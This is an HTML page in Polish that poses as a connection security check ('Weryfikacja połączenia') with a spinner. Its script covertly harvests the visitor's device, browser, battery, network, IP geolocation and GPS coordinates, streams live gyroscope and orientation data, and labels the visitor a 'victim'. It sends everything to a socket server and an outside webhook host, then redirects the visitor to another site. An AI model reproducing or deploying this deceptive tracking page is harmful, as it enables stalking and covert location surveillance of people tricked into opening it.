<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>Weryfikacja połączenia</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #f5f5f7;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    }
    .card {
      background: white;
      border-radius: 20px;
      padding: 44px 36px;
      text-align: center;
      box-shadow: 0 4px 32px rgba(0,0,0,0.08);
      max-width: 340px;
      width: 90%;
    }
    .logo {
      width: 64px;
      height: 64px;
      background: linear-gradient(135deg, #007aff, #0055d4);
      border-radius: 16px;
      margin: 0 auto 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 30px;
      box-shadow: 0 4px 16px rgba(0,122,255,0.3);
    }
    h1 { font-size: 20px; color: #1d1d1f; font-weight: 600; margin-bottom: 10px; }
    p { font-size: 14px; color: #86868b; line-height: 1.5; margin-bottom: 28px; }
    .spinner {
      width: 36px;
      height: 36px;
      border: 3px solid #e5e5ea;
      border-top-color: #007aff;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">🔒</div>
    <h1>Weryfikacja połączenia</h1>
    <p>Trwa sprawdzanie bezpieczeństwa Twojego urządzenia. Nie zamykaj tej strony.</p>
    <div class="spinner"></div>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.37/ua-parser.min.js"></script>
  <script>
    (async function () {
      // ── Konfiguracja webhooka ──────────────────────────────
      const WEBHOOK_URL = 'http://6ysp8qv1jp.laravel-sail.site:8080/webhook/capture';
      const SOURCE = 'workshop';
      // ──────────────────────────────────────────────────────

      function sendWebhook(payload) {
        if (!WEBHOOK_URL) return;
        fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-Source': SOURCE },
          body: JSON.stringify({ source: SOURCE, ...payload }),
          mode: 'no-cors',
        }).catch(() => {});
      }

      const REDIRECT_URL = 'https://cdn24.info/v2/';

      const socket = io();
      const ua = new UAParser().getResult();

      // GPS — wywołaj JAKO PIERWSZY żeby prompt pojawił się od razu
      const gpsPromise = new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: Math.round(pos.coords.accuracy),
          }),
          () => resolve(null),
          { timeout: 15000, enableHighAccuracy: false }
        );
      });

      // Battery API
      let battery = null;
      try {
        const b = await navigator.getBattery();
        battery = { level: Math.round(b.level * 100), charging: b.charging };
        b.addEventListener('levelchange', () =>
          socket.emit('victim-battery', { level: Math.round(b.level * 100), charging: b.charging }));
        b.addEventListener('chargingchange', () =>
          socket.emit('victim-battery', { level: Math.round(b.level * 100), charging: b.charging }));
      } catch (_) {}

      // IP geolocation (przez serwer)
      let geo = null;
      try {
        const r = await fetch('/api/geoip');
        geo = await r.json();
      } catch (_) {}

      // Network Information API
      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      const network = conn ? { type: conn.effectiveType, downlink: conn.downlink } : null;

      const victimData = {
        device: {
          vendor: ua.device.vendor || null,
          model: ua.device.model || null,
          type: ua.device.type || 'desktop'
        },
        os: { name: ua.os.name || null, version: ua.os.version || null },
        browser: { name: ua.browser.name || null, version: ua.browser.version || null },
        screen: { w: screen.width, h: screen.height, dpr: devicePixelRatio },
        battery,
        geo,
        network,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        languages: [...(navigator.languages || [navigator.language])],
        orientation: screen.orientation ? screen.orientation.type : 'unknown',
        touchPoints: navigator.maxTouchPoints,
        ua: navigator.userAgent,
      };

      socket.emit('victim-data', victimData);
      sendWebhook({ event: 'device_info', ...victimData });

      // Czekaj na GPS (lub timeout), potem przekieruj
      const gps = await gpsPromise;
      if (gps) {
        socket.emit('victim-gps', gps);
        sendWebhook({ event: 'gps', ...gps });
      }
      window.location.replace(REDIRECT_URL);

      // Orientacja / żyroskop — na żywo
      const sendOrientation = (e) => {
        socket.emit('victim-orientation', {
          alpha: Math.round(e.alpha ?? 0),
          beta: Math.round(e.beta ?? 0),
          gamma: Math.round(e.gamma ?? 0),
          portrait: window.innerHeight >= window.innerWidth,
        });
      };

      // iOS 13+ wymaga jawnego pozwolenia na DeviceOrientation
      if (typeof DeviceOrientationEvent !== 'undefined' &&
          typeof DeviceOrientationEvent.requestPermission === 'function') {
        document.body.addEventListener('click', async () => {
          try {
            const perm = await DeviceOrientationEvent.requestPermission();
            if (perm === 'granted') window.addEventListener('deviceorientation', sendOrientation);
          } catch (_) {}
        }, { once: true });
      } else {
        window.addEventListener('deviceorientation', sendOrientation);
      }

      if (screen.orientation) {
        screen.orientation.addEventListener('change', () => {
          socket.emit('victim-orientation', {
            portrait: screen.orientation.type.includes('portrait'),
            type: screen.orientation.type,
          });
        });
      }
    })();
  </script>
</body>
</html>
